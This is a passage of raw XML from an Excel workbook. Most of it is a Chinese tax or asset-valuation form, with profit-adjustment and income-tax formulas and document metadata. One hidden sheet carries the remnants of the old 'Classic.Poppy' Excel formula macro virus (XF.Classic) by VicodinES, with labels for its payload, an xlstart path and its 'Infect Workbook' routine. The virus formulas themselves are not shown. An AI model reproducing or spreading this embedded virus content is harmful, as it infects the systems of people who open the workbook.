    <row r="20" ht="24" customHeight="1" s="415">
      <c r="A20" s="636" t="n">
        <v>14</v>
      </c>
      <c r="B20" s="640" t="n"/>
      <c r="C20" s="640" t="n"/>
      <c r="D20" s="643" t="inlineStr">
        <is>
          <t>清查调整数</t>
        </is>
      </c>
      <c r="E20" s="644" t="n"/>
      <c r="F20" s="639" t="n"/>
      <c r="G20" s="639" t="n"/>
      <c r="H20" s="641" t="n"/>
    </row>
    <row r="21" ht="24" customHeight="1" s="415">
      <c r="A21" s="636" t="n">
        <v>15</v>
      </c>
      <c r="B21" s="645" t="n"/>
      <c r="C21" s="646" t="inlineStr">
        <is>
          <t>调前利润</t>
        </is>
      </c>
      <c r="D21" s="646" t="inlineStr">
        <is>
          <t>利润调整数</t>
        </is>
      </c>
      <c r="E21" s="646" t="inlineStr">
        <is>
          <t>不涉及税调整数</t>
        </is>
      </c>
      <c r="F21" s="646" t="inlineStr">
        <is>
          <t>调整后利润</t>
        </is>
      </c>
      <c r="G21" s="639" t="n"/>
      <c r="H21" s="639" t="n"/>
    </row>
    <row r="22" ht="24" customHeight="1" s="415">
      <c r="A22" s="636" t="n">
        <v>16</v>
      </c>
      <c r="B22" s="38" t="inlineStr">
        <is>
          <t>所得额</t>
        </is>
      </c>
      <c r="C22" s="647" t="n"/>
      <c r="D22" s="638" t="n"/>
      <c r="E22" s="638" t="n"/>
      <c r="F22" s="645">
        <f>D22+C22</f>
        <v/>
      </c>
      <c r="G22" s="639">
        <f>C10+D22</f>
        <v/>
      </c>
      <c r="H22" s="639">
        <f>G22-D10</f>
        <v/>
      </c>
    </row>
    <row r="23" ht="24" customHeight="1" s="415">
      <c r="A23" s="636" t="n">
        <v>17</v>
      </c>
      <c r="B23" s="38" t="n"/>
      <c r="C23" s="40" t="n"/>
      <c r="D23" s="40" t="n"/>
      <c r="E23" s="40" t="n"/>
      <c r="F23" s="40" t="n"/>
      <c r="G23" s="639" t="n"/>
      <c r="H23" s="639">
        <f>H22-D24</f>
        <v/>
      </c>
    </row>
    <row r="24" ht="24" customHeight="1" s="415">
      <c r="A24" s="636" t="n">
        <v>18</v>
      </c>
      <c r="B24" s="38" t="inlineStr">
        <is>
          <t>所得税</t>
        </is>
      </c>
      <c r="C24" s="645">
        <f>IF(C22&lt;0,0,ROUND(C22*C23,2))</f>
        <v/>
      </c>
      <c r="D24" s="642">
        <f>IF(D22&lt;0,0,ROUND(D22*$D$23,2))</f>
        <v/>
      </c>
      <c r="E24" s="647" t="n"/>
      <c r="F24" s="645">
        <f>IF(F22&lt;0,0,ROUND(F22*$D$23,2))</f>
        <v/>
      </c>
      <c r="G24" s="648">
        <f>F24-C24</f>
        <v/>
      </c>
      <c r="H24" s="639" t="n"/>
    </row>
    <row r="25" ht="24" customHeight="1" s="415">
      <c r="C25" s="649">
        <f>C19-D19</f>
        <v/>
      </c>
    </row>
    <row r="26" ht="21.75" customHeight="1" s="415">
      <c r="C26" s="650" t="n"/>
    </row>
    <row r="27" ht="27" customHeight="1" s="415"/>
  </sheetData>
  <printOptions horizontalCentered="1" verticalCentered="1"/>
  <pageMargins left="0.62992125984252" right="0.62992125984252" top="0.72" bottom="0.972222222222222" header="0.511811023622047" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="75"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet112.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet108">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:C26"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="C1" sqref="C1"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="8.16666666666667" defaultRowHeight="15.2"/>
  <cols>
    <col width="26.8333333333333" customWidth="1" style="1" min="1" max="1"/>
    <col width="1.16666666666667" customWidth="1" style="1" min="2" max="2"/>
    <col width="28.8333333333333" customWidth="1" style="1" min="3" max="3"/>
    <col width="8.16666666666667" customWidth="1" style="1" min="4" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="17.6" customHeight="1" s="415">
      <c r="A1" t="inlineStr"/>
    </row>
    <row r="2" ht="15.95" customHeight="1" s="415">
      <c r="A2" s="2" t="inlineStr">
        <is>
          <t>Book1</t>
        </is>
      </c>
    </row>
    <row r="3" ht="15.95" customHeight="1" s="415">
      <c r="A3" s="3" t="inlineStr">
        <is>
          <t>D:\MICROSOFT OFFICE\OFFICE\xlstart\Book1.</t>
        </is>
      </c>
      <c r="C3" s="4" t="inlineStr">
        <is>
          <t>**Auto and On Sheet Starts Here**</t>
        </is>
      </c>
    </row>
    <row r="4">
      <c r="A4" s="3" t="n">
        <v>3</v>
      </c>
    </row>
    <row r="6" ht="15.95" customHeight="1" s="415"/>
    <row r="7" ht="16.8" customHeight="1" s="415">
      <c r="A7" s="5" t="inlineStr">
        <is>
          <t>Classic.Poppy by VicodinES</t>
        </is>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="6" t="inlineStr">
        <is>
          <t>With Lord Natas</t>
        </is>
      </c>
    </row>
    <row r="9" ht="16.8" customHeight="1" s="415">
      <c r="A9" s="7" t="inlineStr">
        <is>
          <t>An Excel Formula Macro Virus (XF.Classic)</t>
        </is>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="6" t="inlineStr">
        <is>
          <t>Hydrocodone/APAP 10-650 For Your Computer</t>
        </is>
      </c>
    </row>
    <row r="11" ht="17.55" customHeight="1" s="415">
      <c r="A11" s="8" t="inlineStr">
        <is>
          <t>(C) The Narkotic Network 1998</t>
        </is>
      </c>
    </row>
    <row r="13" ht="15.95" customHeight="1" s="415"/>
    <row r="14" ht="15.95" customHeight="1" s="415">
      <c r="A14" s="4" t="inlineStr">
        <is>
          <t>**Simple Payload**</t>
        </is>
      </c>
    </row>
    <row r="16" ht="15.95" customHeight="1" s="415"/>
    <row r="17" ht="15.95" customHeight="1" s="415">
      <c r="C17" s="4" t="inlineStr">
        <is>
          <t>**Set Our Values and Paths**</t>
        </is>
      </c>
    </row>
    <row r="20">
      <c r="A20" s="9" t="inlineStr">
        <is>
          <t>**Add New Workbook, Infect It, Save It As Book1.xls**</t>
        </is>
      </c>
    </row>
    <row r="26" ht="15.95" customHeight="1" s="415">
      <c r="C26" s="10" t="inlineStr">
        <is>
          <t>**Infect Workbook**</t>
        </is>
      </c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 password="8863"/>
  <pageMargins left="0.75" right="0.75" top="1" bottom="0.972222222222222" header="0.5" footer="0.597222222222222"/>
  <pageSetup orientation="portrait" paperSize="9"/>
  <headerFooter alignWithMargins="0">
    <oddHeader/>
    <oddFooter>&amp;L&amp;"宋体"&amp;11 被评估单位填表人：_x000a_填表日期：2022年  月  日&amp;R&amp;"宋体"&amp;11 评估人员：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Seaman</dc:creator>
  <dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">新版通用申报表</dc:title>
  <dcterms:created xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="dcterms:W3CDTF">1999-04-09T00:44:00Z</dcterms:created>
  <dcterms:modified xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="dcterms:W3CDTF">2026-05-30T05:08:15Z</dcterms:modified>
  <cp:lastModifiedBy>林郁张</cp:lastModifiedBy>
  <cp:lastPrinted>2021-01-12T06:47:00Z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3E65B0DF5A10412B8839863320CF67F6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KSOReadingLayout" fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4">
    <vt:bool xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">0</vt:bool>
  </property>
  <property name="patternType" fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5">
    <vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">assets</vt:lpwstr>
  </property>
  <property name="CalculationRule" fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6">
    <vt:i4 xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">0</vt:i4>
  </property>
</Properties>
</file>